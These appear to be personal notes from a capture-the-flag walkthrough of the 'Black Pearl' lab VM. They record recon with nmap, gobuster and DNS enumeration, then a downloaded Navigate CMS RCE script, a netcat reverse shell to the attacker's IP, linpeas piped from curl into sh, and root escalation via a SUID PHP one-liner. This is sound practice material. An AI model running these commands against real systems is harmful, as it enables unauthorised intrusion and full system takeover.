
```python
export TARGET_IP=192.168.254.138
export TARGET_MAC=00:0c:29:5f:85:ed
export TARGET_NETWORK=192.168.254.0/24
```

scanning
```python
sudo arp-scan -l  
```
192.168.254.138 00:0c:29:88:07:a1       (Unknown)


nmap port/serv disco
```python
sudo nmap -p- -v -A -T4 $TARGET_IP
```

```output
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 66:38:14:50:ae:7d:ab:39:72:bf:41:9c:39:25:1a:0f (RSA)
|   256 a6:2e:77:71:c6:49:6f:d5:73:e9:22:7d:8b:1c:a9:c6 (ECDSA)
|_  256 89:0b:73:c1:53:c8:e1:88:5e:c3:16:de:d1:e5:26:0d (ED25519)
53/tcp open  domain  ISC BIND 9.11.5-P4-5.1+deb10u5 (Debian Linux)
| dns-nsid: 
|_  bind.version: 9.11.5-P4-5.1+deb10u5-Debian
80/tcp open  http    nginx 1.14.2
|_http-title: Welcome to nginx!
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.14.2
MAC Address: 00:0C:29:88:07:A1 (VMware)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.8
Uptime guess: 33.068 days (since Sun Oct 13 11:49:40 2024)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=258 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

Went to port 80 in browswer
```python
http://192.168.254.138
```
in page source
```output
<!DOCTYPE html>
<html>
<head>
<title>Welcome to nginx!</title>
<style>
    body {
        width: 35em;
        margin: 0 auto;
        font-family: Tahoma, Verdana, Arial, sans-serif;
    }
</style>
</head>
<body>
<h1>Welcome to nginx!</h1>
<p>If you see this page, the nginx web server is successfully installed and
working. Further configuration is required.</p>

<p>For online documentation and support please refer to
<a href="http://nginx.org/">nginx.org</a>.<br/>
Commercial support is available at
<a href="http://nginx.com/">nginx.com</a>.</p>

<p><em>Thank you for using nginx.</em></p>
</body>
<!-- Webmaster: alek@blackpearl.tcm -->
</html>

```

interesting info
Webmaster: alek@blackpearl.tcm

Gobuster while i work
```python
gobuster dir -u http://192.168.254.138 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

```output
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.254.138
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/secret               (Status: 200) [Size: 209]
Progress: 220560 / 220561 (100.00%)
===============================================================
Finished

```

Interesting
/secret
...
just a file containing
```output
OMG you got r00t !


Just kidding... search somewhere else. Directory busting won't give anything.

<This message is here so that you don't waste more time directory busting this particular website.>

- Alek 
```

looking at port 53
```python
dig axfr @192.168.254.138
```

```output
; <<>> DiG 9.20.2-1-Debian <<>> axfr @192.168.254.138
; (1 server found)
;; global options: +cmd
.                       499193  IN      NS      c.root-servers.net.
.                       499193  IN      NS      j.root-servers.net.
.                       499193  IN      NS      e.root-servers.net.
.                       499193  IN      NS      a.root-servers.net.
.                       499193  IN      NS      f.root-servers.net.
.                       499193  IN      NS      d.root-servers.net.
.                       499193  IN      NS      k.root-servers.net.
.                       499193  IN      NS      i.root-servers.net.
.                       499193  IN      NS      m.root-servers.net.
.                       499193  IN      NS      g.root-servers.net.
.                       499193  IN      NS      b.root-servers.net.
.                       499193  IN      NS      h.root-servers.net.
.                       499193  IN      NS      l.root-servers.net.
a.root-servers.net.     499193  IN      A       198.41.0.4
b.root-servers.net.     499193  IN      A       170.247.170.2
c.root-servers.net.     499193  IN      A       192.33.4.12
d.root-servers.net.     499193  IN      A       199.7.91.13
e.root-servers.net.     499193  IN      A       192.203.230.10
f.root-servers.net.     499193  IN      A       192.5.5.241
g.root-servers.net.     499193  IN      A       192.112.36.4
h.root-servers.net.     499193  IN      A       198.97.190.53
i.root-servers.net.     499193  IN      A       192.36.148.17
j.root-servers.net.     499193  IN      A       192.58.128.30
k.root-servers.net.     499193  IN      A       193.0.14.129
l.root-servers.net.     499193  IN      A       199.7.83.42
m.root-servers.net.     499193  IN      A       202.12.27.33
a.root-servers.net.     499193  IN      AAAA    2001:503:ba3e::2:30
b.root-servers.net.     499193  IN      AAAA    2801:1b8:10::b
c.root-servers.net.     499193  IN      AAAA    2001:500:2::c
d.root-servers.net.     499193  IN      AAAA    2001:500:2d::d
e.root-servers.net.     499193  IN      AAAA    2001:500:a8::e
f.root-servers.net.     499193  IN      AAAA    2001:500:2f::f
g.root-servers.net.     499193  IN      AAAA    2001:500:12::d0d
h.root-servers.net.     499193  IN      AAAA    2001:500:1::53
i.root-servers.net.     499193  IN      AAAA    2001:7fe::53
j.root-servers.net.     499193  IN      AAAA    2001:503:c27::2:30
k.root-servers.net.     499193  IN      AAAA    2001:7fd::1
l.root-servers.net.     499193  IN      AAAA    2001:500:9f::42
m.root-servers.net.     499193  IN      AAAA    2001:dc3::35
;; Query time: 0 msec
;; SERVER: 192.168.254.138#53(192.168.254.138) (UDP)
;; WHEN: Fri Nov 15 12:37:18 EST 2024
;; MSG SIZE  rcvd: 839

```

server maybe misconfigured

```python
dig @192.168.254.138 blackpearl.tcm AXFR
```

localhost dns enumeration
```python
dnsrecon -r 127.0.0.0/24 -n 192.168.254.138
```

```output
[*] Performing Reverse Lookup from 127.0.0.0 to 127.0.0.255
[+]      PTR blackpearl.tcm 127.0.0.1
[+] 1 Records Found

```

adding to /etc/hosts
```python
echo "192.168.254.138 blackpearl.tcm" | sudo tee -a /etc/hosts
```
 
 in firefox
```python
http://blackpearl.tcm
```
default php page
PHP Version 7.3.27-1~deb10u1

```python
gobuster dir -u http://blackpearl.tcm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

looked up navigate CMS exploit
found
https://github.com/0x4r2/Navigate-CMS-RCE-Unauthenticated-?tab=readme-ov-file

```python
wget https://raw.githubusercontent.com/0x4r2/Navigate-CMS-RCE-Unauthenticated-/main/navigate_RCE.sh
```

```python
chmod +x navigate_RCE.sh
```

```python
./navigate_RCE.sh blackpearl.tcm
```

boom got a shell on system
user:
www-data

upgrade shell
```python
nc -lvnp 4240
```

```python
nc -e /bin/sh 192.168.254.132 4240
```

```python
python -c 'import pty; pty.spawn("/bin/bash")'
```

LinPEAS
```python
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

```output
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
alek:x:1000:1000:alek,,,:/home/alek:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
mysql:x:106:112:MySQL Server,,,:/nonexistent:/bin/false
bind:x:107:113::/var/cache/bind:/usr/sbin/nologin

```

/usr/bin/php7.3 -r 'posix_setuid(0); system("/bin/sh");'
<bin/php7.3 -r 'posix_setuid(0); system("/bin/sh");'
whoami
whoami
root
pwd
pwd
/var/www/blackpearl.tcm/navigate
cd /root
cd /root
ls
ls
flag.txt
cat flag.txt
cat flag.txt
